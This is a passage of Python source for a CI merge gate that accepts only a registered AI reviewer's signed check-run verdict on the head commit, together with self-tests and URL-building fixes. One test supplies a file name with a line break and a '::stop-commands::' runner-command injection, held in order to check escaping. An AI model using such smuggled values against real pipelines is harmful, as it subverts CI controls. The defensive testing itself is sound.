    It asserts WHAT MAIN ASKED GITHUB FOR as well as what it concluded. The fake
    raises on any endpoint but the two, so the day somebody reinstates the
    reviews or comments fetch — the routes retired with Codex — this goes red
    rather than quietly reading prose again.
    """
    head = "090e429a31cd5f0b2e4d7a1c9b8e6f4d2a1c3b5e"
    ok, findings = _run("success", sha=head), _run("failure", sha=head)
    # files, check runs, exit code, must appear in the output, what it is
    cases = [
        ([{"filename": "review-gate.py"}], [ok], 0, "note:",
         "a change to the gate itself, read clean, opens — the deadlock his ruling created"),
        ([{"filename": ".github/workflows/check.yml"}], [ok], 0, "note:",
         "and so does a change to a workflow"),
        ([{"filename": "README.md"}], [ok], 0, "ok:", "an ordinary change opens"),
        ([{"filename": "review-gate.py"}], [findings], 1, "note:",
         "findings on a gate change are red, and it is still announced as one"),
        ([{"filename": "README.md"}], [], 1, "no reviewer has read", "an unread commit is red"),
        ([{"filename": "README.md"}], [_run("success", app=ACTIONS_APP, sha=head)], 1,
         "no reviewer has read",
         "and so is a clean run from the App every workflow token here holds"),
        ([{"filename": "README.md"}], [_run(status="in_progress", sha=head)], 1,
         "no reviewer has read", "a run that has not finished is not a read, and is red"),
        ([{"filename": "review-gate.py"}], [], 1, "note:",
         "an unread change to the gate is red, and still announced as one"),
        ([{"filename": ".github/workflows/a\n::stop-commands::x.yml"}], [ok], 0, "note:",
         "a workflow whose name carries a line break is announced, and starts no command"),
    ]
    want_asked = ["/repos/o/r/commits/%s/check-runs" % head, "/repos/o/r/pulls/7/files"]
    bad = 0
    real = urllib.request.urlopen
    for files, runs, code, must, what in cases:
        asked = []

        def fake(req, *a, **k):
            parts = urllib.parse.urlsplit(req.full_url)
            asked.append(parts.path)
            # Page two onwards is empty, or _pages() would paginate for ever.
            first = urllib.parse.parse_qs(parts.query).get("page", ["1"])[0] == "1"
            if parts.path.endswith("/files"):
                body = files if first else []
            elif parts.path.endswith("/check-runs"):
                body = {"check_runs": runs if first else []}
            else:
                raise AssertionError("main() asked GitHub for %s, which this gate does not "
                                     "read — the prose routes went with Codex" % parts.path)
            return io.BytesIO(json.dumps(body).encode())

        out = io.StringIO()
        stdout = sys.stdout
        urllib.request.urlopen = fake
        sys.stdout = out
        try:
            got = main(["review-gate.py", "o/r", "7", head, "token"])
        except AssertionError as e:
            urllib.request.urlopen, sys.stdout = real, stdout
            print("  main: %s — %s" % (what, e))
            bad += 1
            continue
        finally:
            urllib.request.urlopen, sys.stdout = real, stdout
        said = out.getvalue()
        if got != code:
            print("  main: %s — expected exit %d, got %d (%s)" % (what, code, got, said.strip()))
            bad += 1
        if must not in said:
            print("  main: %s — expected %r in the output, got %r" % (what, must, said.strip()))
            bad += 1
        # A gate change is announced on the check as well as in its log, and
        # nothing else is: an annotation on every change would teach the same
        # blindness a green tick does.
        noticed = any(l.startswith("::notice ") for l in said.splitlines())
        if noticed != (must == "note:"):
            print("  main: %s — %s" % (what, "announced in the log but not on the check"
                                       if must == "note:" else "annotated, and it is not a gate change"))
            bad += 1
        # And nothing else it prints is a runner command: the file names are the
        # pull request's writing, and one could otherwise start its own.
        stray = [l for l in said.splitlines()
                 if l.startswith("::") and not l.startswith("::notice title=")]
        if stray:
            print("  main: %s — a line the runner would obey: %r" % (what, stray[0]))
            bad += 1
        if sorted(set(asked)) != want_asked:
            print("  main: %s — asked GitHub for %s; it must ask for exactly %s"
                  % (what, sorted(set(asked)), want_asked))
            bad += 1
    if not bad:
        print("ok: main() was run against a GitHub answering from a dictionary in %d case(s) — "
              "it asked for the changed files and the check runs and nothing else, and a change "
              "to the gate itself now opens on the one reviewer's clean read" % len(cases))
    return bad


def _url_cases():
    """The URLs the gate asks GitHub for, and the one that was wrong.

    Codex's P1 on `a706799`: every verdict case in the selftest passed while the
    live fetch asked a different question, because nothing here had ever built a
    URL. A rule proved only against hand-made dictionaries is proved against the
    wrong thing.
    """
    runs = "https://api.github.com/repos/o/r/commits/abc/check-runs"
    return [
        (runs, 1, {"filter": "all"},
         {"filter": ["all"], "per_page": ["100"], "page": ["1"]},
         "the check runs, with the filter passed as a parameter"),
        (runs + "?filter=all", 2, None,
         {"filter": ["all"], "per_page": ["100"], "page": ["2"]},
         "the same filter arriving in the URL — the shape that gave "
         "filter='all?per_page=100' and silently fell back to `latest`"),
        ("https://api.github.com/repos/o/r/pulls/7/files", 3, None,
         {"per_page": ["100"], "page": ["3"]},
         "a plain endpoint with no query of its own — the changed files, which is "
         "the other fetch the gate still makes"),
    ]


def _selftest():
    head = "090e429a31cd5f0b2e4d7a1c9b8e6f4d2a1c3b5e"
    other = "29d7b5435bf968d75ac7451c5457d440fcba5a0c"
    # The badge, and every way a looser test would be talked into one. Only the
    # first two are the reviewer speaking; the rest are what a branch, a tidy-up
    # or GitHub itself can put on the same commit.
    badge_cases = [
        (_run("success", sha=head), CLEAN, "the badge's clean verdict on this commit"),
        (_run("failure", sha=head), FINDINGS, "its findings on this commit"),
        (_run("success", sha=other), None, "its clean verdict on another commit"),
        (_run("success", status="queued", sha=head), None,
         "a run queued on this commit, whatever its conclusion field says"),
        (_run("success", status="in_progress", sha=head), None, "or one still running"),
        (_run("neutral", sha=head), None, "the shape it writes when it ran and could not read"),
        (_run("cancelled", sha=head), None, "a run somebody cancelled"),
        (_run("timed_out", sha=head), None, "one GitHub timed out"),
        (_run("action_required", sha=head), None, "one asking for a hand"),
        (_run("skipped", sha=head), None, "one that never ran"),
        (_run("stale", sha=head), None, "one GitHub called stale"),
        (_run("success", app=ACTIONS_APP, sha=head), None,
         "the same verdict from the GitHub Actions app — the token every workflow here holds"),
        (_run("success", app=None, sha=head), None, "a check run with no app at all"),
        (_run("success", app="5000405", sha=head), None, "the app id as a string, not the id"),
        (_run("success", name="Claude Review", sha=head), None,
         "the right app under a name this gate does not read"),
    ]
    # What the whole gate answers, given everything on one commit. With one
    # reviewer answering by one route these are short, and the shortness is the
    # point: what used to be reachable through a comment, a submitted review, a
    # summary table and a check run is now reachable one way.
    gate_cases = [
        ([_run("success", sha=head)], (CLEAN, "claude"), "the badge clean and nothing else"),
        ([_run("failure", sha=head)], (FINDINGS, "claude"), "the badge's findings on the head"),
        ([_run("failure", sha=head), _run("success", sha=head)], (FINDINGS, "claude"),
         "asked twice on one commit, the findings stand — the answer to a finding is a push"),
        ([_run("success", sha=head), _run("failure", sha=head)], (FINDINGS, "claude"),
         "and in either order, because worst wins per reviewer rather than last"),
        ([_run(status="in_progress", sha=head)], (UNREAD, None), "a run not yet finished is no read"),
        ([_run("failure", sha=head), _run(status="in_progress", sha=head)], (FINDINGS, "claude"),
         "a fresh read in flight does not retire the findings already on the commit"),
        ([_run("success", sha=other)], (UNREAD, None), "a clean verdict on another commit"),
        ([_run("success", app=ACTIONS_APP, sha=head)], (UNREAD, None),
         "a clean check run from the app every workflow token here holds"),
        ([], (UNREAD, None), "an empty pull request"),
    ]
    # A GATE CHANGE IS NOW JUDGED EXACTLY AS AN ORDINARY ONE IS, and these cases
    # are here to say so rather than to prove a door. The door was
    # `GATE_REVIEWER`, its only value was Codex, and it went with him; what is
    # left is `gate_note()`, which shuts nothing and is held on its own below.
    # Before the ruling the first four of these answered CROSS_VENDOR — red — and
    # the only thing that opened them was a Codex read, which is why the change that
    # retires Codex could not merge until this rule went.
    gate_file_cases = [
        (["review-gate.py"], [_run("success", sha=head)], (CLEAN, "claude"),
         "the badge clears a change to the gate itself"),
        (["check.sh"], [_run("success", sha=head)], (CLEAN, "claude"), "and to the check that runs it"),
        ([".github/workflows/review.yml"], [_run("success", sha=head)], (CLEAN, "claude"),
         "and to the reviewer it is"),
        ([".github/workflows/anything-new.yml"], [_run("success", sha=head)], (CLEAN, "claude"),
         "and to a workflow a branch adds"),
        (["review-gate.py"], [_run("failure", sha=head)], (FINDINGS, "claude"),
         "findings on a gate change still shut it"),
        (["review-gate.py"], [], (UNREAD, None), "and an unread gate change is still unread"),
        (["README.md"], [_run("success", sha=head)], (CLEAN, "claude"), "an ordinary change still clears"),
        (["design/SCREEN-LAW.md", "README.md"], [_run("success", sha=head)], (CLEAN, "claude"),
         "and so does one touching several ordinary files"),
    ]
    # gate_note() is the whole of what a gate change now buys, so it is held to
    # saying something on one and nothing on the other. A note that quietly
    # stopped appearing would be this change's own failure mode.
    note_cases = [
        (["review-gate.py"], True, "a gate change is announced"),
        ([".github/workflows/door.yml"], True, "and so is a change to any workflow"),
        ([], False, "an ordinary change is not"),
    ]
    bad = 0

    def hold(got, want, what):
        if got == want:
            return 0
        print("  selftest: %s — expected %s, got %s" % (what, want, got))
        return 1

    for run, want, what in badge_cases:
        bad += hold(check_run_verdict(run, head), want, what)
    for runs, want, what in gate_cases:
        bad += hold(verdict(runs, head), want, what)
    for paths, runs, want, what in gate_file_cases:
        # touches_the_gate() is still computed, because what it answers is what
        # the note below is built from — it simply no longer changes the verdict.
        bad += hold(verdict(runs, head), want, what + " (gate files: %s)" % touches_the_gate(paths))
    for paths, want, what in note_cases:
        bad += hold(gate_note(touches_the_gate(paths)) is not None, want, what)
    # touches_the_gate says which files are the gate, so it is held on its own
    # rather than only through the cases above.
    bad += hold(touches_the_gate(["README.md", "check.sh", ".github/workflows/x.yml"]),
                [".github/workflows/x.yml", "check.sh"], "which files are the gate")
    bad += hold(touches_the_gate(["board/build.py", "board/vercel.json"]), ["board/build.py"],
                "the board's build is the gate, its other files are not (#113's fifth read)")
    # Every file the gate counts as itself is read as risky, so `GATE_FILES`
    # cannot drift from the class (#113's sixth read): each needs a class case
    # of its own. `GATE_DIRS` is held by the class's own directory arms.
    bad += hold(sorted(f for f in GATE_FILES if ([f], "risky") not in CLASS_CASES), [],
                "every gate file has a class case that reads it as risky")
    bad += hold(touches_the_gate(["design/ARCHITECT.md", "AGENTS.md"]), [], "and which are not")
    # THE RETIRED ROUTES ARE HELD SHUT, not merely deleted. A later session
    # restoring a prose reader would have to get past these: the gate reads check
    # runs, so nothing a person or a bot can type is an answer.
    for name in ("comment_verdict", "review_verdict", "_codex_comment_verdict", "_key_for",
                 "_says_clean", "CLEAN_VERDICT", "SUMMARY_MARKER", "GATE_REVIEWER", "CODEX",
                 "CODEX_ASK"):
        bad += hold(hasattr(sys.modules[__name__], name), False,
                    "%s is gone — the gate reads no prose" % name)
    # And the two answers no input reached, held shut the same way: written
    # back with a case asserting it, either is the guard over nothing #46 was
    # caught by.
    for name in ("CROSS_VENDOR", "NO_VERDICT"):
        bad += hold(hasattr(sys.modules[__name__], name), False,
                    "%s is gone — no input reaches it" % name)
    bad += hold([k for k, w in REVIEWERS.items() if w["login"] or w["comment"]], [],
                "no reviewer on the register answers by a route the gate stopped reading")
    for url, page, params, want, what in _url_cases():
        built = _page_url(url, page, params)
        bad += hold(urllib.parse.parse_qs(urllib.parse.urlsplit(built).query), want, what)
        # One query string, and the path untouched: a second `?` is how the
        # parameters got swallowed in the first place.
        bad += hold(built.count("?"), 1, what + " — exactly one query string")
        bad += hold(urllib.parse.urlsplit(built).path, urllib.parse.urlsplit(url).path,
                    what + " — the path unchanged")
    if bad:
        print("review-gate selftest failed: %d case(s)" % bad)
        return 1
    # A fake is anything that is not this reviewer's verdict on this commit and
    # would open the gate if the test were looser: another App's run, no App at
    # all, the id as a string, the right App under another name, a conclusion
    # GitHub wrote rather than the reviewer, a verdict on a different commit.
    # The count fell when Codex went, and it fell because the surface did: every
    # fake it counted lived in prose the gate no longer reads.
    fakes = (sum(1 for b in badge_cases if b[1] is None)
             + sum(1 for g in gate_cases if g[1] == (UNREAD, None)))
    print("ok: review gate reads a verdict only from the %d reviewer(s) on the register, only "
          "as a check run they signed, and only on the commit in front of it; it counts no "
          "comment and no submitted review, so the routes Codex answered by are shut rather "
          "than idle; it asks GitHub for %d URL(s) that carry the parameters they say they do; "
          "and it is fooled by none of the %d fakes"
          % (len(REVIEWERS), len(_url_cases()), fakes))
    # Both run, always: `or` stopped at the first failure and hid the second
    # until the next push.
    failed = _check_main()
    failed += _check_wiring()
    failed += _check_product_wiring()
    failed += _check_product_loosenings()
    failed += _check_board_loosenings()
    failed += _check_review_loosenings()
    failed += _check_read_loosenings()
    failed += _check_class_loosenings()
    failed += _check_route_loosenings()
    failed += _check_registry()
    failed += _check_caller()
    failed += _check_caller_loosenings()
    failed += _check_context()
    failed += _check_alert()
    failed += _check_product_glm()
    failed += _check_expressions()
    failed += _check_attempt_loosenings()
    failed += _check_more_loosenings()
    failed += _check_context_loosenings()
    failed += _check_pick_loosenings()
    failed += _check_link_loosenings()
    return 1 if failed else 0


# Which fetch is in flight. There are two — the changed files and the check runs
# — and an error that names the wrong one sends the next session looking behind
# the wrong door. It was four while Codex's reviews and comments were read.
_asking = [""]


def _page_url(url, page, params=None):
    """`url`, keeping any query it already carries, plus `params` and this page.

    Codex's P1 on `a706799`, and it was live rather than theoretical. The old
    form pasted `?per_page=…` onto a URL that already carried `?filter=all`,
    giving `?filter=all?per_page=100&page=1`. That parses as
    `filter="all?per_page=100"` with no `per_page` at all — and GitHub does not
    refuse it, it ignores the unrecognised filter and falls back to the default,
    `latest`. So the live fetch quietly asked for only the newest check run per
    name while this file documented, and its selftest proved, a worst-wins rule
    over every run on the commit. A findings verdict could have been retired by
    asking again until the answer came out differently: the exact hole the
    caller's comment says it closes. Nothing in the selftest could see it,
    because the selftest never built a URL.

    So the query is assembled rather than concatenated, and a URL that arrives
    with a query of its own keeps it. Both are held by _url_cases() below.
    """
    parts = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    query += sorted((params or {}).items())
    query += [("per_page", "100"), ("page", str(page))]
    return urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(query)))


def _pages(url, token, key=None, params=None):
    """Every page of a GitHub list, whether it answers bare or in a wrapper."""
    _asking[0] = urllib.parse.urlsplit(url).path.rsplit("/", 1)[-1]
    page = 1
    while True:
        req = urllib.request.Request(
            _page_url(url, page, params),
            headers={"Authorization": "Bearer " + token, "Accept": "application/vnd.github+json"},
        )
        with urllib.request.urlopen(req) as r:
            body = json.load(r)
        batch = body if key is None else body.get(key, [])
        if not batch:
            return
        for item in batch:
            yield item
        page += 1


def main(argv):
    if len(argv) == 2 and argv[1] == "--selftest":
        return _selftest()
    if len(argv) != 5:
        print("usage: review-gate.py <owner/repo> <pr-number> <head-sha> <token> | --selftest")
        return 2
    repo, num, head, token = argv[1:5]
    api = "https://api.github.com/repos/%s" % repo

    try:
        # TWO FETCHES, WHERE THERE WERE FOUR. The reviews and the issue comments
        # were Codex's two voices and are not asked for at all now — not fetched
        # and ignored, which would leave a reader wondering which of them still
        # counted. The changed files are still asked for: they no longer decide
        # who may clear this, but they decide what the note below says.
        files = [f.get("filename") for f in _pages("%s/pulls/%s/files" % (api, num), token)]
        # `filter=all`, not the default `latest`: every run the badge has made on
        # this commit counts, worst first. On `latest` a findings verdict could be
        # retired by asking again until the answer came out differently, and the
        # gate's own rule is that the answer to a finding is a push.
        runs = list(_pages("%s/commits/%s/check-runs" % (api, head), token,
                           key="check_runs", params={"filter": "all"}))
        gate_files = touches_the_gate(files)
        answer, who = verdict(runs, head)
    except urllib.error.HTTPError as e:
        if e.code in (401, 403):
            why = ("the workflow's token may not read this (it needs pull-requests: read and "
                   "checks: read), or GitHub is rate-limiting")
        elif e.code == 404:
            why = "GitHub found no such repository, pull request or commit — check GITHUB_REPOSITORY, PR_NUMBER and HEAD_SHA"
        elif e.code >= 500:
            why = "GitHub itself answered with an error — re-run the check"
        else:
            why = "GitHub refused the request"
        print("reason: HTTP %s when asked for the %s — %s" % (e.code, _asking[0] or "changed files", why))
        return 2
    # Said on the way past, green or red: the tree that judged this pull request
    # is the tree it proposes, and there is no second reviewer to catch that.
    note = gate_note(gate_files)
    if note:
        print("note: " + note)
        # And as an annotation, so it sits on the check itself rather than only
        # in a log that a green tick gives nobody a reason to open (found on
        # #56). A workflow command's data escapes %, CR and LF and nothing
        # else, and the note carries file names, which the pull request writes.
        print("::notice title=A change to the review machinery::"
              + note.replace("%", "%25").replace("\r", "%0D").replace("\n", "%0A"))
    if answer == CLEAN:
        print("ok: %s has read %s and left nothing on it" % (REVIEWERS[who]["name"], head))
        return 0
    print("reason: " + reason(answer, who, head))
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
